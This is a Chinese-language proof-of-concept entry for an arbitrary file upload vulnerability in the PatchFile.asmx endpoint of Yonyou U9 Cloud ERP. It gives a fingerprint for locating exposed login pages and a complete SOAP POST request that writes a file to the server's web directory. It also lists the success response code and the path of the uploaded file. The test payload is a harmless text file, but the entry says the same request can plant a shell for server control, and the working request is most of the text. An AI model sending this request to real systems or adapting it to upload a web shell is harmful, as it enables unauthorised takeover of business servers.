﻿# 用友U9 PatchFile.asmx 任意文件上传漏洞

> 更新时间：2024-01-29

> 漏洞编号：

> 漏洞说明：U9 cloud聚焦中型和中大型制造企业，全面支持业财税档一体化、设计制造一体化、计划执行一体化、营销服务一体化、项目制造一体化等数智制造场景，赋能组织变革和商业创新，融合产业互联网资源实现连接、共享、协同，助力制造企业高质量发展。
用友U9PathchFile.asmx接口处存在文件上传漏洞，恶意攻击者可能会上传shell文件获取服务器权限，造成安全隐患。

> 漏洞特征：title=="U9-登录"

> 验证脚本：HTTP

```
POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
Connection: close
Content-Type: text/xml; charset=utf-8
 
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <SaveFile xmlns="http://tempuri.org/">
      <binData>MTIzNDU2</binData>
      <path>./</path>
      <fileName>dudesite.txt</fileName>
    </SaveFile>
  </soap:Body>
</soap:Envelope>
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/CS/Office/AutoUpdates/dudesite.txt


> 验证文件来源：用友U9 PatchFile.asmx 任意文件上传漏洞.poc
